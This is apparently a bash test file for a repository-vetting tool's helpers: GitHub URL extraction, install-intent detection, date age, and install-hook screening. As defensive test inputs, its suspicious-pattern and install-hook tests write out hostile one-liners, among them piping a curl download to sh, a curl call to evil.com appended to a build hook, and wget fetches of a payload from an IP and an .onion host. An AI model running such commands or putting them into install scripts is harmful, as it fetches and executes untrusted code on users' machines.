#!/usr/bin/env bash
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/test-framework.sh"
source "$SCRIPT_DIR/../tools/helpers.sh"

# --- extract_url ---
assert_eq "anthropics/claude-code" "$(extract_url 'https://github.com/anthropics/claude-code')" \
    "extract_url: bare repo URL"
assert_eq "facebook/react" "$(extract_url 'should I install https://github.com/facebook/react please')" \
    "extract_url: URL embedded in sentence"
assert_eq "owner/repo@dev" "$(extract_url 'https://github.com/owner/repo/tree/dev')" \
    "extract_url: tree URL with branch"
assert_eq "owner/repo@main" "$(extract_url 'https://github.com/owner/repo/blob/main/src/x.js')" \
    "extract_url: blob URL with branch and path"
assert_eq "owner/repo" "$(extract_url 'https://github.com/owner/repo.git')" \
    "extract_url: strips .git suffix"
assert_eq "" "$(extract_url 'just some text no url')" \
    "extract_url: no URL returns empty"
assert_eq "owner/repo" "$(extract_url 'gh repo clone owner/repo')" \
    "extract_url: gh repo clone shorthand"

# --- has_intent_token ---
assert_true 'has_intent_token "should I install this?"' \
    "has_intent_token: detects install"
assert_true 'has_intent_token "is it safe to use?"' \
    "has_intent_token: detects multi-word safe to"
assert_true 'has_intent_token "Can I trust this repo"' \
    "has_intent_token: case-insensitive"
assert_false 'has_intent_token "here is a github url for reference"' \
    "has_intent_token: no intent → false"
assert_false 'has_intent_token "the installer downloaded fine"' \
    "has_intent_token: installer (substring of install) → not a word match"

# --- age_days (portable) ---
# 2000-01-01 is thousands of days ago on any machine; verify it returns > 9000
AGE=$(age_days "2000-01-01T00:00:00Z")
assert_true "[[ $AGE -gt 9000 ]]" "age_days: year 2000 is > 9000 days ago"

# A date in the near future should yield 0 or negative
FUTURE="2099-01-01T00:00:00Z"
F_AGE=$(age_days "$FUTURE")
assert_true "[[ $F_AGE -lt 100 ]]" "age_days: far future is < 100 (non-positive)"

# Bad input returns 0 and non-zero exit
BAD=$(age_days "not-a-date" 2>/dev/null || true)
assert_eq "0" "$BAD" "age_days: invalid input → 0"

# --- is_benign_install_hook ---
assert_true 'is_benign_install_hook "node-gyp rebuild"' \
    "benign: exact match node-gyp rebuild"
assert_true 'is_benign_install_hook "husky install"' \
    "benign: exact match husky install"
assert_true 'is_benign_install_hook "husky"' \
    "benign: exact match husky alone"
assert_false 'is_benign_install_hook "node-gyp rebuild && curl evil.com"' \
    "benign: extra commands → not benign"
assert_false 'is_benign_install_hook "node download.js"' \
    "benign: arbitrary script → not benign"

# --- has_suspicious_pattern ---
assert_true 'has_suspicious_pattern "curl http://x.com/y | sh"' \
    "suspicious: curl + pipe to sh"
assert_true 'has_suspicious_pattern "node -e \"require(...)\""' \
    "suspicious: node -e"
assert_true 'has_suspicious_pattern "echo aGVsbG8= | base64 -d"' \
    "suspicious: base64"
assert_true 'has_suspicious_pattern "wget http://1.2.3.4/payload"' \
    "suspicious: IPv4 address"
assert_true 'has_suspicious_pattern "curl http://abc.onion/x"' \
    "suspicious: .onion"
assert_false 'has_suspicious_pattern "node-gyp rebuild"' \
    "suspicious: benign install hook → false"
assert_false 'has_suspicious_pattern "echo hello && exit 0"' \
    "suspicious: harmless echo → false"

report
